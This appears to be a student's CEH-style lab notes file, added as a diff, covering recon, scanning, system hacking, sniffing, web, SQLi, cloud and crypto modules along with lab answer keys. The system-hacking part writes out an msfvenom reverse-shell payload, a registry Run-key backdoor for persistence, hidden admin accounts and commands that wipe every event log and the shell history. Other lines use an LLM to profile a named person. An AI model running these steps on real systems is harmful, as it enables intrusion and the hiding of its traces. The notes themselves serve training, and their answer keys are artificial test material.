@@ -1,0 +1,221 @@
+10.10.1.13 #Parrot host machine
+10.10.1.11 #Win 11
+10.10.1.19 #Win 2019
+10.10.1.22 #Win 2022
+
+10.10.1.9 #Ubuntu
+10.10.1.2 #Gateway 
+10.10.1.30 #win 2019AD
+10.10.1.9 #Win 11AD
+==============================================================
+[Recon +]
+162.159.25.175
+
+recon-ng
+modules load recon/domains-contacts/whois_pocs
+set source targetdomain.com
+run
+
+workspaces create testone
+dp insert domains
+tesla.com
+modules load recon/companies-domains/censys_subdomains
+
+==============================================================
+[scan Lab +]
+Use the Metasploit to scan the target machine. While using Metasploit auxiliary module “auxiliary/scanner/smb/smb_version”, enter the specified range of remote hosts (RHOSTS)?
+set RHOSTS 10.10.1.5-23
+netbios-ssn
+==============================================================
+
+theHarvester -d eccouncil -l 200 -b linkedin
+recon-ng
+sgpt --chat footprint --shell "User Sherlock to gather personal information about 'Sundar Pichai' and save the results in recon.txt"
+===============================================================
+r=remote
+rusers
+rwho
+finger
+
+===============================================================
+#Module4 lab:
+Windows server 2029>administrator>cmd(admin)
+nbtstat -a 10.10.1.11
+nbtstat -c
+net use
+new view
+
+nmap -sU -p161 --script=snmp-sysdescr 10.10.1.12  # Fetches system description from SNMP service
+nmap -sU -p161 --script=snmp-win32-software 10.10.1.22  # Enumerates installed Win32 software via SNMP
+nmap -sU -p161 --script=snmp-interfaces 10.10.1.22  # Retrieves network interface details from SNMP
+
+dig ns certifiedhacker.com
+
+nmap -p 25 --script=smtp-enum-users 10.10.1.19
+sgpt --shell "Scan the target 10.10.1.22 for the service version of the port 445 using nmap"
+
+===============================================================
+[Vuln +]
+nikto -h https://www.certifiedhacker.com -o nikto_results -F txt
+
+[Lab Answer+]
+Out-of-bounds Write
+docker run -d -p 443:443 –-name openvas mikesplain/openvas
+c2hhcmVkLmJsdWVob3N0LmNvbQ===
+
+===============================================================
+[System Hacking]
+zsteg #Steganography Detection tool
+
+#Deleting Incognito History
+ipconfig /flushdns #win
+killall -INFO mDNSResponder #linux
+
+#Hiding windows users
+net user alex /add #add
+net user dragon pass123 #password set
+net  user alex /active:yes #active
+net user alex /active:no #hide
+net localgroup Administrators alex /add #Create admin level user
+
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+service apache2 start
+--------------------------------
+#Maintain persistence by modifying registry run keys
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe>registry.exe
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"
+
+se exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+-----------------------------------
+[Win clear logs]
+Clear_Event_Viewer_logs.bat
+wevtutil el #list logs
+wevtutil cl Security #Clear logs
+wevtutil el | ForEach-Object { wevtutil cl $_ } #Clear all logs
+cipher /w:[Drive or Folder or File Location]  #cipher overwrite deleted file from the disk
+-----------
+[Powershell Enable script execution]
+powershell -EP Bypass
+------------
+[LAB Answers:]
+-I
+PowerShell IEX
+overwrite.py
+workgroup
+SERVER2019
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+wevtutil cl system
+export HISTSIZE=0
+advanced!
+===============================================================
+[Malware threat +]
+[video]
+chaos ransomeware builder
+fileless malware
+AI-Based malware
+-----------------
+[#Lab]
+http://kernel32.ir
+Windows 11 64 bit
+tini.exe
+Red Hat Linux
+===============================================================
+[Sniffing]
+7layers(All People Should Try New Dominos Pizza)
+
+[Lab Answers:]
+54 bytes
+00068
+http.request.method == POST
+Warning
+--script=sniffer-detect
+===============================================================
+[DDOS]
+[video]
+ISB (I'm So Bored)
+UltraDDOS-v2 tools
+chown -R www-data:www-data /var/www/html/share/
+-----------------
+[Lab]
+Block IP (B)
+===============================================================
+[Web Server]
+searchsploit -t apache RCE
+#Website mirroring
+wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://certifiedhacker.com
+
+[Lab]
+Microsoft-IIS/10.0
+3389
+apple
+Jason
+Apache-Coyote/1.1
+
+===============================================================
+[Module 14: Hacking Web Application]
+#Automated vuln scanner manual scanner
+
+[Lab]
+10.10.1.19
+Server2019
+ASP.NET
+Spider
+CWE-311
+admin/qwerty@123
+wp-upg
+OSHP-X-Frame-Options
+ModSecurity
+===============================================================
+[Module15: SQLi]
+127.0.0.1 fonts.googleapis.com
+sqlmap --os-shell
+
+[Lab]
+password
+89
+19
+
+==============================================================
+[Module17-Android]
+
+[Lab]
+com.android.camera2
+-i
+getSMS inbox
+Issues to fix
+
+===============================================================
+Module-19 (Cloud Computing)
+Powershell(Amin)
+Install-Module AADInternals
+Import-Module AADInternals
+Invoke-AADIntReconAsOutsider -DomainName eccouncil.org | Format-table
+#Now, we will perform user enumeration in Azure AD, in the PowerShell window type Invoke-AADIntUserEnumerationAsOutsider -UserName user@company.com
+Get-AADIntLoginInformation -Domain user@company
+
+aws s3 ls s3://certifiedhacker02
+g:http://certifiedhacker02.s3.amazonaws.com/
+#Let us move some files to the certifiedhacker02 bucket
+echo "You have been Hacked" >> Hack.txt
+#Let us try to move the Hack.txt file to the certifiedhacker02 bucket.
+aws s3 mv Hack.txt s3://certifiedhacker02
+To verify whether the file is moved, switch to the browser window and maximize it. Reload the page
+http://certifiedhacker02.s3.amazonaws.com
+#Let us delete the Hack.txt file from the certifiedhacker02 bucket.
+aws s3 rm s3://certifiedhacker02/Hack.txt
+
+docker pull ubuntu
+trivy image ubuntu
+docker pull nginx:1.19.6
+trivy image nginx:1.19.6
+
+===============================================================
+[Module 20- Cryptography]
+=Lab
+
+#Lab Topics
+CyberChef
+Cryptoforge
+Create and Use Self-signed Certificates 
